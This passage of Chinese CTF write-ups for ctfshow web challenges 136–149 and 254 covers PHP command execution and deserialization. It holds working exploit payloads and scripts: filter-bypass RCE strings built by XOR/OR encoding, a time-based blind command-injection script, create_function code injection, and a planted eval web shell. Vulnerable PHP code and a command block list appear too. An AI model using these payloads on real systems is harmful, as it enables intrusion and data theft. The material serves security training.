如果传入第二个参数（数组），可以将所有输出保存到这个数组中；
第三个参数是一个整数变量，用于捕获命令执行后的返回状态码。
```


</details>


我们可以将结果重定向到某个文件，然后再访问对应的文件，但是`>`被过滤，我们可以使用tee命令来实现类似的功能，tee命令可以将命令的输出写入到标准输出的同时写入到一个文件中


```php
?c=ls /|tee 1			//随后访问/1  --->发现f149_15_h3r3
?c=cat /f149_15_h3r3|tee 1     //随后访问/1
```


然后访问1下载文件读取flag

### web137

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
call_user_func($_POST['ctfshow']);
```


p<strong>hp中 ->与:: 调用类中的成员的区别</strong>

<strong>->用于动态语境处理某个类的某个实例</strong>

<strong>::可以调用一个静态的、不依赖于其他初始化的类方法.</strong>

<strong>ctfshow::getFlag</strong>

payload:

POST:   <strong>ctfshow=ctfshow::getFlag</strong>   访问对象的函数即可

### web138
strripos过滤冒号，call_user_func传数组


```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
 
if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}
 
call_user_func($_POST['ctfshow']);
```


<strong>strripos()函数</strong>:用于查找字符串在另一字符串中最后一次出现的位置，这里相当于就是对提交内容过滤掉了冒号

对于call_user_func 我们还可以通过数组来传递

<strong>代码逻辑</strong>

1. `class ctfshow`  
定义了一个名为 `ctfshow` 的类，包含两个方法：
    - `__wakeup()`：当对象被反序列化时，触发 `__wakeup()` 方法，输出 `"private class"` 并终止脚本。
    - `getFlag()`：静态方法，输出 `flag.php` 文件的内容。
2. `strripos($_POST['ctfshow'], ":") > -1`  
检查 `$_POST['ctfshow']` 中是否包含冒号 `:`。如果包含，输出 `"private function"` 并终止脚本。
3. `call_user_func($_POST['ctfshow']);`  
调用 `call_user_func()` 函数，执行通过 `POST` 传递的 `ctfshow` 参数

这段代码的目的是限制用户输入的 `ctfshow` 参数，防止用户直接调用类方法（如 `ctfshow::getFlag`）。通过检查 `:` 字符，代码试图阻止用户调用类方法。

#### strripos(\$_POST`['ctfshow']`, ":")>-1
1. <strong>`$_POST['ctfshow']`</strong>  
这是通过 `POST` 请求传递的 `ctfshow` 参数的值。
2. <strong>`strripos($_POST['ctfshow'], ":")`</strong>  
在 `$_POST['ctfshow']` 中查找 `:` 最后一次出现的位置。
3. <strong>`> -1`</strong>
    - 如果 `:` 存在，`strripos()` 返回的位置是一个非负整数（如 `0`, `1`, `2` 等），因此 `> -1` 为 `true`。
    - 如果 `:` 不存在，`strripos()` 返回 `false`，`false > -1` 为 `false`。

因此，`strripos($_POST['ctfshow'], ":") > -1` 的意思是：<strong>检查 </strong><strong>`$_POST['ctfshow']`</strong><strong> 中是否包含 </strong><strong>`:`</strong>。

payload:

<strong>ctfshow`[0]`=ctfshow&ctfshow`[1]`=getFlag</strong>

---

1. <strong>数组调用的特性</strong>  
如果 `$_POST['ctfshow']` 是一个数组，`call_user_func()` 会将其解析为 `[类名, 方法名]` 的形式，从而调用类方法。
2. <strong>绕过 </strong><strong>`:`</strong><strong> 检查</strong>  
通过传递 `ctfshow[0]=ctfshow&ctfshow[1]=getFlag`，`$_POST['ctfshow']` 会被解析为 `['ctfshow', 'getFlag']`，而不会包含 `:`，从而绕过 `:` 检查。

### web139

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```


我们先用web136的方法去做 发现下载不了文件，带不出回显，可以盲注

我们要解决两个问题

+ 截取字符串
+ 判断命令执行结构

截取字符串可以用`awk`命令

判断命令执行结果可以用shell编程的if语句和sleep()函数

我们举个例子

#### eg:
awk逐行获取


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-106.webp)

cut命令截取单独的字符


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-107.webp)

shell语句，if语句控制输出，sleep语句控制相应时间


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-108.webp)


```python
import requests
import time
import string
 
str = string.ascii_letters + string.digits + "-" + "{" + "}" + "_" + "~"    # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加
result = ""          # 初始化一个空字符串，用于保存结果
 
#获取多少行
for i in range(1, 99):
    key = 0   #用于控制内层循环(j)的结束
 
    #不break的情况下，一行最多几个字符
    for j in range(1, 99):
        if key == 1:
            break
        for n in str:       #n就是一个一个的返回值
            payload = "if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)   #{n}是占位符
            #print(payload)
            url = "http://13f0afe4-289b-4fcf-b2ed-6cf6cdf78635.challenge.ctf.show/?c=" + payload
            try:
                requests.get(url, timeout=(2.5, 2.5))   #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。
 
            # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环
            except:
                result = result + n
                print(result)
                break
            if n == '~':    #str的最后一位，“~”不常出现，用作结尾
                key = 1
    # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置
    result += " "
```


读取/f149_15_h3r3


```python
import requests
import time
import string
 
str = string.digits + string.ascii_lowercase + "-" + "_" + "~"# 题目过滤花括号，这里就不加了
result = ""
for j in range(1, 99):
    for n in str:
        payload = "if [ `cat /f149_15_h3r3 |cut -c {0}` == {1} ];then sleep 3;fi".format(j, n)
        # print(payload)
        url = "http://13f0afe4-289b-4fcf-b2ed-6cf6cdf78635.challenge.ctf.show/?c=" + payload
        try:
            requests.get(url, timeout=(2.5, 2.5))
        except:
            result = result + n
            print(result)
            break
        if n=="~":
            result = result + "花括号"
```


### web140

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2']))
{
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1))
    {
        if(preg_match('/^[a-z0-9]+$/', $f2))
        {
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow')
            {
                echo file_get_contents("flag.php");
            }
        }
    }
}
```


1. `eval("return $f1($f2());");`  
执行 `eval()` 函数，将 `$f1` 和 `$f2` 的值动态拼接为 PHP 代码并执行。
2. `intval($code) == 'ctfshow'`  
将 `$code` 转换为整数，并与字符串 `'ctfshow'` 进行比较。如果相等，输出 `flag.php` 文件的内容。

`intval($code)` 会将 `$code` 转换为整数，因此需要构造 `$code` 的值，使其转换为整数后与 `'ctfshow'` 相等。

+ intval()成功时，返回参数的integer值，失败时返回0。空的array返回0，非空的array返回1。字符串有可能返回0，取决于字符串最左侧的字符。
+ intval()不能用于object,否则会产生E_NOTICE错误并返回1。

---

PHP 的 `==` 是一种松散类型比较运算符，它在比较两个值时，会尝试将它们转换为相同的类型，然后再进行比较。这种类型转换的规则有时会导致一些不符合直觉的结果。  
 因为 `"ctfshow"` 的开头是字母 `c`，而不是数字，所以它会被转换为整数 `0`。

因此<strong>intval(\$code) = 0</strong>即

所以需要`$f1($f2());`的返回值是字母开头的字符串，或者是空数组，或者就是0，或者FLASE


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-109.webp)

intval会将非数字字符转换为0，也就是说 <span style="color: rgb(199, 37, 78)">`intval('a')==0 intval('.')==0 intval('/')==0`</span>

<strong>如果代码中有 </strong><strong>`return`</strong><strong> 语句</strong>  
`eval()` 会返回 `return` 语句后面的值。


```php
f1=system&f2=system
system(system())
system()必须包含参数，失败返回FLASE; system('FLASE'),空指令，失败返回FLASE。
```



```php
f1=usleep&f2=usleep
usleep(usleep())
usleep没有返回值。所以intval参数为空，失败返回0
```



```php
f1=getdate&f2=getdate
//array getdate([ int $timestamp = time()] )
//：返回结果是array，参数必须是int型。
//所以getdate(getdate())---->getdate(array型)—>失败返回flase，intval为0。
```


### web141

```php
<?php
#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

```


<strong>\W`：与任何非单词字符匹配。就是除了数字、字母、下划线。等价于`</span>`[^A-Za-z0-9_]`</strong>

<strong>代码逻辑</strong>

1. 接收三个 `GET` 参数 `v1`、`v2` 和 `v3`。
2. 检查 `v1` 和 `v2` 是否为数字，`v3` 是否为非字母、数字和下划线的字符。
3. 如果校验通过，动态拼接并执行表达式 `$v1$v3$v2`。
4. 输出表达式及其计算结果。


+ php里数字可以和命令进行运算，也就是说v3里要执行的函数前后加上运算符即可。
+ `1-phpinfo()-1`结果为0，phpinfo()执行成功后返回true，1-1-1=-1
+ 同理`system()`也可执行。

因此此题v1=1 v2=1即可

构造v3等于命令如system ls	将其使用二进制源码进行异或位运算得到相应的字母

脚本如下：


```python
import os
import re
from urllib.parse import unquote

def make_dic(operation):
    filename = f"rce_{operation}.txt"
    if not os.path.exists(filename):
        print("Making dictionary...")
        with open(filename, "w") as myfile:
            contents = []
            seen = set()  # 使用集合来跟踪已添加的结果

            # 遍历所有可能的字节值（0-255）
            for i in range(256):
                for j in range(256):
                    # 将$i和$j转换为两个字符的十六进制表示
                    hex_i = f'{i:02x}'
                    hex_j = f'{j:02x}'

                    # 正则表达式用于匹配特定字符
                    pattern = re.compile(r'[0-9a-z\^\+\~\$\[\]\{\}\&\-]', re.IGNORECASE)

                    # 如果十六进制字符转换为二进制后匹配正则表达式，则跳过此循环
                    if pattern.match(bytes.fromhex(hex_i).decode('latin1')) or pattern.match(
                            bytes.fromhex(hex_j).decode('latin1')):
                        continue

                    # 将十六进制值添加百分号前缀并进行URL解码
                    a = f'%{hex_i}'
                    b = f'%{hex_j}'
                    match operation:
                        case "and":
                            c = chr(ord(unquote(a)) & ord(unquote(b)))
                        case "or":
                            c = chr(ord(unquote(a)) | ord(unquote(b)))
                        case "xor":
                            c = chr(ord(unquote(a)) ^ ord(unquote(b)))

                    # 如果解码后的字符是可打印字符（ASCII 32-126），则将其添加到内容列表中
                    if 32 <= ord(c) <= 126 and c not in seen:
                        contents.append(f"{c} {a} {b}\n")
                        seen.add(c)  # 将结果添加到集合中

            # 将内容写入文件
            myfile.writelines(contents)
            print("Making dictionary...done")
    else:
        print("Dictionary already exists!!")

def generate_payload(text, operation):

    op_symbols = {"and": '&', "or": '|', "xor": '^'}
    op = op_symbols[operation]
    s1 = []
    s2 = []
    filename = f"rce_{operation}.txt"

    with open(filename, 'r') as f:
        lines = f.readlines()

    for char in text:
        for line in lines:
            if char == line[0]:
                s1.append(line[2:5])
                s2.append(line[6:].strip())
                break
    return f"(\"{''.join(s1)}\"{op}\"{''.join(s2)}\")"

function = input("Please input your function: ")

command = input("Please input your command: ")

while True:
    operation = input("Please input your operation (and or xor): ")
    if operation in ["and", "or", "xor"]:
        break
    else:
        print("Please choose one of the following: and, or, xor")

make_dic(operation)

payload = generate_payload(function, operation) + generate_payload(command, operation)

print("Generated payload is :" + payload)

```


输入system ls or/xor/and可得system ls的url编码

输入cat f* 可得

payload:

?v1=1&v2=1&v3=-("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13"|"%60%60")-  	//system  /  ls    / or

payload:

<strong>?v1v=1&v2=1&v3=-("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%14%01%03%20%06%0c%02"|"%60%60%60%20%60%60%28")-		//system / cat f* /or</strong>

### web142

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```


<strong>代码逻辑</strong>

+ <strong>v1是数字，v1与5个</strong><strong>`0x36d`</strong><strong>相乘的结果是</strong><strong>`sleep`</strong><strong>的时间，然后会输出flag的内容。0与任意数相乘为0，让v1为0即可即时得到结果。</strong>

0x36d（十六进制）---> 54（十进制）

payload:	<strong>?v1=0</strong>

### web143

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```


相比Web141 我们会发现<span style="color: rgb(192, 52, 29)">`+`</span>和<span style="color: rgb(192, 52, 29)">`-`</span>不能用了换成<span style="color: rgb(192, 52, 29)">`*`</span>。<span style="color: rgb(192, 52, 29)">`|`</span>被过滤了，<strong>使用异或</strong><span style="color: rgb(192, 52, 29)"><strong>`^`</strong></span><strong><span style="color: rgb(192, 52, 29)"> 即 xor</span></strong>


```python
import os
import re
from urllib.parse import unquote

def make_dic(operation):
    filename = f"rce_{operation}.txt"
    if not os.path.exists(filename):
        print("Making dictionary...")
        with open(filename, "w") as myfile:
            contents = []
            seen = set()  # 使用集合来跟踪已添加的结果

            # 遍历所有可能的字节值（0-255）
            for i in range(256):
                for j in range(256):
                    # 将$i和$j转换为两个字符的十六进制表示
                    hex_i = f'{i:02x}'
                    hex_j = f'{j:02x}'

                    # 正则表达式用于匹配特定字符
                    pattern = re.compile(r'[0-9a-z\^\+\~\$\[\]\{\}\&\-]', re.IGNORECASE)

                    # 如果十六进制字符转换为二进制后匹配正则表达式，则跳过此循环
                    if pattern.match(bytes.fromhex(hex_i).decode('latin1')) or pattern.match(
                            bytes.fromhex(hex_j).decode('latin1')):
                        continue

                    # 将十六进制值添加百分号前缀并进行URL解码
                    a = f'%{hex_i}'
                    b = f'%{hex_j}'
                    match operation:
                        case "and":
                            c = chr(ord(unquote(a)) & ord(unquote(b)))
                        case "or":
                            c = chr(ord(unquote(a)) | ord(unquote(b)))
                        case "xor":
                            c = chr(ord(unquote(a)) ^ ord(unquote(b)))

                    # 如果解码后的字符是可打印字符（ASCII 32-126），则将其添加到内容列表中
                    if 32 <= ord(c) <= 126 and c not in seen:
                        contents.append(f"{c} {a} {b}\n")
                        seen.add(c)  # 将结果添加到集合中

            # 将内容写入文件
            myfile.writelines(contents)
            print("Making dictionary...done")
    else:
        print("Dictionary already exists!!")

def generate_payload(text, operation):

    op_symbols = {"and": '&', "or": '|', "xor": '^'}
    op = op_symbols[operation]
    s1 = []
    s2 = []
    filename = f"rce_{operation}.txt"

    with open(filename, 'r') as f:
        lines = f.readlines()

    for char in text:
        for line in lines:
            if char == line[0]:
                s1.append(line[2:5])
                s2.append(line[6:].strip())
                break
    return f"(\"{''.join(s1)}\"{op}\"{''.join(s2)}\")"

function = input("Please input your function: ")

command = input("Please input your command: ")

while True:
    operation = input("Please input your operation (and or xor): ")
    if operation in ["and", "or", "xor"]:
        break
    else:
        print("Please choose one of the following: and, or, xor")

make_dic(operation)

payload = generate_payload(function, operation) + generate_payload(command, operation)

print("Generated payload is :" + payload)

```


payload:

<span style="color: rgb(192, 52, 29)">?v1=1&v2=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%03%01%0b%01%06%0c%01%07%01%0f%08%0f"^"%60%60%7f%21%60%60%60%60%2f%7f%60%7f")*</span>

### web144

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
 
    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
 
function check($str){
    return strlen($str)===1?true:false;
}
```


和web141一样的正则匹配，对应变量这次是v2。  
v3有个check，长度要求为1。

输出的顺序是`$v1$v3$v2`，那么让v3是运算符就可以，这里用减号`-`，加号用`%2b`

payload把web141的修改一下就能用。

<strong>?v1=1&v2=("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%14%01%03%20%06%0c%02"|"%60%60%60%20%60%60%28")&v3=-</strong>

### web145-146

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```


这次异或`^`又被过滤了，可以用或`|`和取反`~`。  
和web143一样，修改一下构造脚本就可以。修改正则匹配条件，修改运算符。  
加减乘数被过滤，也可以用或`|`。


```php
?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1
 
?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1
```


### web147
匿名函数


```php
<?php
highlight_file(__FILE__);
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }
}
```


<strong>代码逻辑</strong>

+ 使用正则表达式 `'/^[a-z0-9_]*$/isD'` 检查 `$ctfshow` 是否仅包含字母、数字和下划线。
+ 正则表达式解析：
    - `^`：匹配字符串的开始。
    - `[a-z0-9_]`：匹配字母（大小写不敏感）、数字和下划线。
    - `*`：匹配前面的字符零次或多次。
    - `$`：匹配字符串的结束。
    - `i`：忽略大小写。
    - `s`：使 `.` 匹配包括换行符在内的所有字符。
    - `D`：强制 `$` 仅匹配字符串的末尾，而不是字符串的结束。
+ 如果 `$ctfshow` 不符合正则表达式的规则，则动态调用 `$ctfshow` 函数。
+ 该函数接受两个参数：
    - 第一个参数为空字符串 `''`。
    - 第二个参数为 `$_GET['show']` 的值。

<strong><span style="color: #DF2A3F">if(!preg_match('/^`[a-z0-9_]`*\$/isD',\$ctfshow))：</span></strong>

+ 表示检查ctfshow中如果只有小写、数字、下划线则preg_match()则返回1，通过!则返回false不执行if
+ 因此，只要ctfshow中存在除数字、小写、下划线外的字符即可执行if

考察点：create_function()代码注入,create_function(‘\$a’,‘echo \$a.“123”’)类似于


```php
function f($a) {
  echo $a."123";
}
```


那么如果我们第二个参数传入 echo 1;}phpinfo();//  
就等价于


```php
function f($a) {
  echo 1;}phpinfo();//
}
```


因此payload：


```php
get: ?show=echo 123;}system('tac f*');//
post: ctf=%5ccreate_function
```


<strong>补充：</strong>

%5c绕过原理：php里默认<span style="color: rgb(252, 85, 49)">命名空间</span>是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。

### web148

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}
 
function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```


还是利用Web141的思路


```php
<?php
$myfile = fopen("rce_or148.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 
 
		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
	// 	$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
	// 	if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
	// 				echo "";
    // }
        $preg='/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/';
        if(preg_match($preg,hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}
 
}
}
fwrite($myfile,$contents);
fclose($myfile);
```



```python
from sys import *
 
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("D:\\learning\\coding\\vs2022_c-language\\Python_pj1\\rce_or148.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)
 
fun="get_ctfshow_fl0g"
cmd=""
print("function:"+action(fun))
print("cmd:"+action(cmd))
```


或在py中更改代码内容

<strong>?code=("%07%05%09%01%03%09%06%08%08%0f%08%01%06%0c%0b%07"^"%60%60%7d%5e%60%7d%60%7b%60%60%7f%5e%60%60%3b%60")();</strong>		//get_ctfshow_f1ag ();  xor

<strong>?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%03%01%09%01%06%0c%01%07%01%0b%08%0b"^"%60%60%7d%21%60%60%60%60%2f%7b%60%7b");</strong>		//system  / cat flag.txt  xor

### web149

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
 
$files = scandir('./'); 
foreach($files as $file) {
  if(is_file($file)){
    if ($file !== "index.php") {
      unlink($file);
    }
  }
}
 
file_put_contents($_GET['ctf'], $_POST['show']);
 
$files = scandir('./'); 
foreach($files as $file) {
  if(is_file($file)){
    if ($file !== "index.php") {
      unlink($file);
    }
  }
}
```


+ <span style="color: rgb(192, 52, 29)">`$files = scandir('./');`</span>：使用 <span style="color: rgb(192, 52, 29)">`scandir`</span> 函数扫描当前目录，并将目录中的所有文件和文件夹的名称存储在数组 <span style="color: rgb(192, 52, 29)">`$files`</span> 中。
+ <span style="color: rgb(192, 52, 29)">`foreach($files as $file) { ... }`</span>：遍历 <span style="color: rgb(192, 52, 29)">`$files`</span> 数组中的每个元素。
+ <span style="color: rgb(192, 52, 29)">`if(is_file($file)){ ... }`</span>：检查当前元素是否为文件。
+ <span style="color: rgb(192, 52, 29)">`if ($file !== "index.php") { ... }`</span>：如果当前文件不是 <span style="color: rgb(192, 52, 29)">`index.php`</span>，则执行 <span style="color: rgb(192, 52, 29)">`unlink($file);`</span>，即删除该文件。


<details>
<summary>代码解释</summary>

#### <strong>第一轮删除文件</strong>

```php
  $files = scandir('./'); 
foreach($files as $file) {
  if(is_file($file)){
    if ($file !== "index.php") {
      unlink($file);
    }
  }
}
```


1. `scandir('./');`

- 获取当前目录下的所有文件和文件夹，返回数组。

2. `foreach($files as $file)`

- 遍历所有文件。

3. `if(is_file($file))`

- 判断 `$file` 是否是一个普通文件（而不是目录）。

4. `if ($file !== "index.php")`

- 确保不删除 `index.php`。

5. `unlink($file);`

- <strong>删除文件</strong>。

<strong>作用</strong>：

- <strong>删除所有文件，除了</strong> `index.php`，防止其他文件影响 PHP 运行。

---

#### <strong>创建用户输入的文件</strong>

```php
file_put_contents($_GET['ctf'], $_POST['show']);
```


1. `$_GET['ctf']`

- 通过 <strong>GET 参数</strong>`ctf` 获取文件名。

2. `$_POST['show']`

- 通过 <strong>POST 参数</strong>`show` 获取文件内容。

3. `file_put_contents($_GET['ctf'], $_POST['show']);`

- <strong>创建一个新文件，文件名来自 GET，内容来自 POST</strong>。

<strong>作用</strong>：

- 用户可以通过 `?ctf=filename` 创建任意文件，并通过 `POST` 提交内容写入。

---

#### <strong>第二轮删除文件</strong>

```php
  $files = scandir('./'); 
foreach($files as $file) {
  if(is_file($file)){
    if ($file !== "index.php") {
      unlink($file);
    }
  }
}
```


- <strong>作用：</strong>

- <strong>再一次删除</strong> `index.php` <strong>以外的所有文件</strong>。
- 这样之前用户创建的文件也会被<strong>立即删除</strong>。

</details>


<strong>GET: ?ctf=index.php</strong>

<strong>POST:show=`<?php eval($_POST['cmd']);?>`</strong>

蚁剑访问index.php

cmd即可

## web入门--反序列化题解
### 常用魔术方法

```plain
反序列化中常用的魔术方法：
 
__wakeup() //执行unserialize()时，先会调用这个函数
 
__sleep() //执行serialize()时，先会调用这个函数
 
__destruct() //对象被销毁时触发
 
__call() //在对象上下文中调用不可访问的方法时触发
 
__callStatic() //在静态上下文中调用不可访问的方法时触发
 
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
 
__set() //用于将数据写入不可访问的属性
 
__isset() //在不可访问的属性上调用isset()或empty()触发
 
__unset() //在不可访问的属性上使用unset()时触发
 
__toString() //把类当作字符串使用时触发
 
__invoke() //当尝试将对象调用为函数时触发

__unserialize() //在反序列化对象时自动调用（PHP 7.4 及以上版本支持）。

1.__construct()
	触发条件：new一个实例化对象的时候
	作用：初始化函数，对类进行初始化，同时也可以执行其它语句
2.__desturct()
	触发条件：销毁一个实例化对象的时候
	作用：析构函数，对实例化对象销毁，同时也可以执行其它语句
3.__wakeup()
	触发条件：反序列化时触发
	作用：额，就是调用一下，函数有什么功能这是自己定义的
4.__sleep()
	触发条件：序列化的时候触发
	作用：额，就是调用一下，函数有什么功能这是自己定义的
5.__invoke
	作用：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。
	例如：class Ctfshow，然后使用$Ctfshow()；时被调用
3.__unserialize()
	触发条件：7.4以上版本，反序列化时触发，且绕过__wakeup()
```


### web254

```php
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```


`$user = unserialize($_COOKIE['user']);` 这行代码的作用是将存储在 `COOKIE` 中的 `user` 值反序列化为一个 PHP 对象。


<details>
<summary>php反序列化解释</summary>

#### <strong>1. 什么是序列化和反序列化？</strong>

- <strong>序列化</strong>：  
  将 PHP 对象转换为字符串的过程，以便可以存储或传输。序列化后的字符串包含对象的类名、属性和值。  
  例如：

```php
$user = new ctfShowUser();
$user->username = "admin";
$user->password = "123456";
echo serialize($user);
```


输出结果：

```php
O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVip";b:0;}
```


- <strong>反序列化</strong>：  
  将序列化后的字符串重新转换为 PHP 对象的过程。  
  例如：

```php
$data = 'O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVip";b:0;}';
$user = unserialize($data);
echo $user->username; // 输出：admin
```


---

#### <strong>2.</strong>`$_COOKIE['user']`<strong>是什么？</strong>

- `$_COOKIE` 是 PHP 的一个超全局变量，用于存储客户端通过 `COOKIE` 发送到服务器的数据。
- `$_COOKIE['user']` 表示从客户端发送的名为 `user` 的 `COOKIE` 值。

例如，如果客户端发送了以下 `COOKIE`：

```php
user=O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVip";b:0;}
```


那么 `$_COOKIE['user']` 的值就是：

```php
O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVip";b:0;}
```


---

#### <strong>3.</strong>`unserialize($_COOKIE['user'])`<strong>的作用</strong>

- `unserialize($_COOKIE['user'])` 将 `COOKIE` 中的 `user` 值反序列化为一个 PHP 对象。
- 反序列化后，`$user` 变量将是一个对象，其类型和属性由序列化字符串决定。

例如：

```php
$user = unserialize($_COOKIE['user']);
echo $user->username; // 输出：admin
echo $user->password; // 输出：123456
```


---

#### <strong>4. 这行代码的作用</strong>

- 这行代码的目的是从 `COOKIE` 中恢复用户对象，以便后续代码可以使用该对象进行登录验证、权限检查等操作。

---

#### <strong>5. 安全问题</strong>

- <strong>反序列化漏洞</strong>：  
  如果攻击者能够控制 `$_COOKIE['user']` 的值，可以构造恶意序列化字符串，反序列化为任意对象或执行任意代码。  
  例如，攻击者可以构造一个 `ctfShowUser` 对象，将 `$isVip` 设置为 `true`，从而绕过 VIP 检查。
- <strong>修复建议</strong>：

1. 避免直接反序列化用户输入。
2. 使用安全的反序列化方法，例如 `json_decode`。
3. 对反序列化数据进行严格验证。

---

#### <strong>示例</strong>

假设 `$_COOKIE['user']` 的值为：

```plain
